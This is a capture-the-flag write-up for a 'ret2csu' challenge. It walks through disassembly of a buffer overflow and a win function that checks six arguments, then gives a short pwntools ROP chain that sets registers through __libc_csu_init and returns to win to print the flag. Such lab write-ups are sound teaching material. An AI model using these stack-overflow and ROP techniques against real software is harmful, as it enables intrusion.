# ret2csu

## Solution

The binary suffers from an overflow:
```
004008d6  8b45ec             mov     eax, dword [rbp-0x14]  {0x10}
004008d9  0537130000         add     eax, 0x1337  {0x1347}
004008de  4863d0             movsxd  rdx, eax  {0x1347}
004008e1  488b45d8           mov     rax, qword [rbp-0x28 {var_30}]
004008e5  4889c6             mov     rsi, rax
004008e8  bf00000000         mov     edi, 0x0
004008ed  e87efdffff         call    read
```
We next notice that the given shared library, `libhelper.so`, contains a `win` function that prints the flag when certain conditions are met. This `win` function is available through the `plt` of the main binary. Upon inspecting the `win` function, one notices that it takes in six argument, and it prints the flag when the arguments have certain values:
```
00000a53  81bddcfeffffbe00…  cmp     dword [rbp-0x124 {var_12c}], 0xbe
00000a5d  0f8597000000       jne     0xafa

00000a63  81bdd8feffff1db0…  cmp     dword [rbp-0x128 {var_130}], 0xb01d
00000a6d  0f8587000000       jne     0xafa

00000a73  81bdd4feffffcefa…  cmp     dword [rbp-0x12c {var_134}], 0xface
00000a7d  757b               jne     0xafa

00000a7f  81bdd0feffffad0b…  cmp     dword [rbp-0x130 {var_138_1}], 0xbad
00000a89  756f               jne     0xafa

00000a8b  81bdccfeffffd000…  cmp     dword [rbp-0x134 {var_13c_1}], 0xd0
00000a95  7563               jne     0xafa

00000a97  81bdc8feffff534a…  cmp     dword [rbp-0x138 {var_140_1}], 0xc4a53
00000aa1  7557               jne     0xafa
```
Thus, we need to set all six arguments to the values needed. Thus, this seems like the perfect use-case of a `ret2csu` exploit, as `__libc_csu_init` is contained in the binary. But there is one major issue, the fourth through sixth arguments are typically decided by `rcx`, `r8`, and `r9`, but we cannot set these registers using using `ret2csu`! An analysis using Ropper showed that there were no obvious tools in the binary to set these registers. Clearly, there was some kind of trick here that needed investigating.

Upon closer inspect of the `win` function, we see the following:
```
00000980  4489a5d0feffff     mov     dword [rbp-0x130 {var_138_1}], r12d
00000987  4489adccfeffff     mov     dword [rbp-0x134 {var_13c_1}], r13d
0000098e  4489b5c8feffff     mov     dword [rbp-0x138 {var_140_1}], r14d
```
This shows that the values of the parameters are overwritten by values in the `r12`, `r13`, and `r14` registers. These registers are ones that we have control over! Thus, we can begin to construct a payload. First, we create a couple of tools (the ret tool is used to prevent stack alignment bugs):
```
ret = (r.find_gadget(['ret']))[0]
win = e.plt['win']
```
Then, we can create the chain:
```
r.raw(cyclic(72))
r.call(ret)
r.ret2csu(edi=0xbe, rsi=0xb01d, rdx=0xface, r12=0xbad, r13=0xd0, r14=0xc4a53)
r.call(ret)
r.call(win)
```
This chain uses `ret2csu` to set the values of the needed registers and then returns to the `win` function. When this payload is sent at the binary, it prints the flag, solving the challenge.